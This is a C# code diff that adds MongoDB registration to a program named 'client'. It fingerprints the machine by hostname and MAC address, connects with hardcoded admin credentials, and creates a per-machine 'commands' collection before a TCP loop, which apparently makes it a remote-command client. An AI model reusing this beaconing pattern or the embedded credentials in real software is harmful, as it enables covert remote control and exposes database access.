@@ -1,4 +1,6 @@
-﻿using System;
+﻿using MongoDB.Bson;
+using MongoDB.Driver;
+using System;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
@@ -11,7 +13,7 @@ namespace client
         {
             try
             {
-                string mac = Environment.MachineName.ToString();
+                string mac = Environment.MachineName.ToString().Trim();
                 NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
                 foreach (NetworkInterface adapter in adapters)
                 {
@@ -21,7 +23,7 @@ namespace client
                     {
                         foreach (GatewayIPAddressInformation address in addresses)
                         {
-                            mac = mac + "@" + adapter.GetPhysicalAddress().ToString();
+                            mac = mac + "@" + adapter.GetPhysicalAddress().ToString().Trim();
                         }
                     }
                 }
@@ -29,6 +31,17 @@ namespace client
                 string databaseport = "27017";
                 mac = mac.Trim();
                 Console.WriteLine(mac);
+                BsonDocument doc = new BsonDocument();
+                doc.Add(new BsonElement("name", "server"));
+                doc.Add(new BsonElement("command", ""));
+                var dbClient1 = new MongoClient("mongodb://server:server99@" + databaseip + ":" + databaseport + "/admin");
+                IMongoDatabase commandsdatabase = dbClient1.GetDatabase("commands");
+                commandsdatabase.DropCollection(mac);
+                var commandscollection = commandsdatabase.GetCollection<BsonDocument>(mac);
+                commandsdatabase.DropCollection(mac);
+                commandscollection.InsertOne(doc);
+
+
                 while (true)
                 {
                     using (TcpClient tcpClient = new TcpClient())
